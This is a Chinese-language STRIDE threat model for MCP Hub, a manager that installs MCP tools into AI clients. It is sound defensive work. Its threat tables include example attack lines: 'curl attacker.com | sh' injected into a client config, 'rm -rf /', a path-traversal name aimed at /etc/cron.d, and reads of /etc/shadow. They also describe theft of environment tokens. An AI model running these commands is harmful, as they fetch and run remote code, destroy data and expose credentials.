# MCP Hub 威胁模型

> 本文档使用 STRIDE 方法对 MCP Hub 进行威胁建模，定义攻击者画像、信任边界、攻击面和缓解措施。
>
> **版本**: 1.0
> **更新频率**: 每季度审查，重大架构变更后即时更新
> **负责人**: 安全架构师

---

## 1. 系统概述

MCP Hub 是一个 MCP 工具管理平台，定位为 "npm + Homebrew"。核心功能：
- 从注册表发现 MCP 工具
- 通过 npm/pip/docker/git/binary 多种方式安装工具
- 将工具配置自动写入 Claude/Cursor/VSCode 等客户端
- 对工具进行安全扫描和评分

## 2. 攻击者画像 (Attacker Profiles)

| 攻击者 | 能力 | 目标 | 动机 |
|--------|------|------|------|
| **AP1: 恶意工具作者** | 控制发布到注册表的 MCP 工具 | 窃取用户凭证、控制用户系统 | 经济利益、间谍活动 |
| **AP2: 本地攻击者** | 同一系统上的其他用户或低权限进程 | 读取其他用户的 MCP 配置、安装目录 | 权限提升、数据窃取 |
| **AP3: 供应链攻击者** | 控制 npm Registry、PyPI、Docker Hub、GitHub | 向广泛使用的依赖注入恶意代码 | 大规模供应链破坏 |
| **AP4: 网络中间人 (MitM)** | 控制网络链路（公共 WiFi、恶意 DNS、BGP 劫持） | 篡改下载的二进制文件、注册表响应 | 数据窃取、恶意软件分发 |
| **AP5: 恶意注册表运营者** | 控制或篡改 MCP Hub Registry | 引导用户安装恶意工具 | 恶意软件分发 |
| **AP6: 社会工程学攻击者** | 诱骗用户执行恶意命令 | 诱导用户安装恶意工具或泄露配置 | 账户接管、勒索 |

## 3. 信任边界 (Trust Boundaries)

```
┌─────────────────────────────────────────────────────────────┐
│  信任边界 1: 用户 shell 环境（当前用户）                       │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  信任边界 2: MCP Hub 进程                             │   │
│  │  ┌─────────────────────────────────────────────┐     │   │
│  │  │  信任边界 3: 安装子进程（npm/pip/docker）     │     │   │
│  │  │  ┌─────────────────────────────────────┐     │     │   │
│  │  │  │  信任边界 4: 已安装的 MCP 工具进程  │     │     │   │
│  │  │  └─────────────────────────────────────┘     │     │   │
│  │  └─────────────────────────────────────────────┘     │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

**信任规则**：
- 内层信任外层，外层**不信任**内层
- 跨信任边界的数据流必须验证
- 从内层到外层的数据（如安装子进程获取的环境变量）属于**数据泄露**

## 4. 攻击面清单 (Attack Surface Inventory)

### 4.1 入口点

| 编号 | 入口点 | 信任级别 | 攻击类型 | 缓解措施 |
|------|--------|----------|----------|----------|
| E1 | CLI 参数 (`tool_name`, `--base-dir`, `--config`, `--registry`) | 不可信 | 路径遍历、命令注入 | 输入验证、基目录限制 |
| E2 | 注册表数据 (`install_command`, `binary_url`, `git_repo`) | 不可信 | 恶意命令注入、木马下载 | 签名验证、URL 白名单 |
| E3 | 安装子进程 (npm/pip/docker/git) | 不可信 | 任意代码执行、凭证窃取 | 环境隔离、沙箱运行 |
| E4 | 客户端配置文件写入 | 半可信 | 配置注入、恶意命令启动 | 命令验证、配置签名 |
| E5 | 网络下载 (binary_url, npm registry) | 不可信 | MitM、恶意文件 | HTTPS 强制、校验和验证 |
| E6 | 环境变量继承 | 高敏感 | 凭证泄露 | 环境白名单 |
| E7 | 日志文件 | 敏感 | 凭证泄露 | 日志脱敏、权限限制 |
| E8 | 安装目录文件系统 | 敏感 | 权限提升、数据篡改 | 权限最小化、目录隔离 |

### 5. STRIDE 分析

#### 5.1 数据流: 注册表 → 安装器 → 客户端配置

| 威胁 | 类别 | 描述 | 缓解 |
|------|------|------|------|
| T-S1 | 欺骗 | 攻击者伪造注册表响应，提供恶意工具元数据 | 注册表签名验证 (Ed25519) |
| T-T1 | 篡改 | 攻击者篡改 `install_command` 或 `binary_url` | 签名验证 + 校验和 |
| T-R1 | 否认 | 用户安装恶意工具后否认 | 不可篡改审计日志 |
| T-I1 | 信息泄露 | 安装子进程读取完整环境变量，泄露 `GITHUB_TOKEN` | 环境变量白名单 |
| T-D1 | 拒绝服务 | 安装命令执行 `rm -rf /` 或耗尽磁盘 | 沙箱隔离 + 资源限制 |
| T-E1 | 权限提升 | 恶意工具安装后篡改系统文件 | 最小权限 + 安装目录限制 |

#### 5.2 数据流: 用户 CLI → 文件系统操作

| 威胁 | 类别 | 描述 | 缓解 |
|------|------|------|------|
| T-S2 | 欺骗 | 用户被诱导执行 `mcp-hub install ../../../etc/cron.d/backdoor` | 工具名白名单验证 |
| T-T2 | 篡改 | `--config` 指向 `/etc/passwd` 被覆盖 | 路径基目录限制 |
| T-I2 | 信息泄露 | `--registry` 读取 `/etc/shadow` | 文件路径白名单 |
| T-E2 | 权限提升 | `tool_name` 包含 `..` 导致写入系统目录 | 路径规范化 + 基目录验证 |

#### 5.3 数据流: 客户端配置 → AI 客户端启动

| 威胁 | 类别 | 描述 | 缓解 |
|------|------|------|------|
| T-T3 | 篡改 | 配置中的 `command` 被替换为 `curl attacker.com \| sh` | 命令白名单 + 绝对路径验证 |
| T-I3 | 信息泄露 | 配置文件中明文存储 API 密钥 | 密钥引用 + OS 密钥管理 |
| T-E3 | 权限提升 | AI 客户端以高权限启动恶意 MCP Server | 配置签名验证 |

## 6. 风险评分矩阵

| 威胁 | 可能性 | 影响 | 风险等级 | 优先级 |
|------|--------|------|----------|--------|
| T-I1 (环境变量泄露) | 高 | 高 | **Critical** | P0 |
| T-T1 (注册表篡改) | 中 | 高 | **High** | P1 |
| T-E1 (权限提升) | 中 | 高 | **High** | P1 |
| T-I3 (明文密钥) | 高 | 中 | **High** | P1 |
| T-S1 (伪造注册表) | 低 | 高 | Medium | P2 |
| T-T3 (配置注入) | 中 | 中 | Medium | P2 |
| T-D1 (拒绝服务) | 低 | 中 | Medium | P2 |

## 7. 假设与依赖

**假设**：
- 用户的操作系统和 Python 运行时本身未被攻破
- 用户不会主动将敏感凭证硬编码在注册表 JSON 中
- 用户使用的 AI 客户端（Claude/Cursor）自身安全

**依赖**：
- OS 密钥管理服务（macOS Keychain、Windows Credential Manager、Linux Secret Service）
- Python `cryptography` 库用于签名验证
- Docker/Podman 用于沙箱隔离（可选）
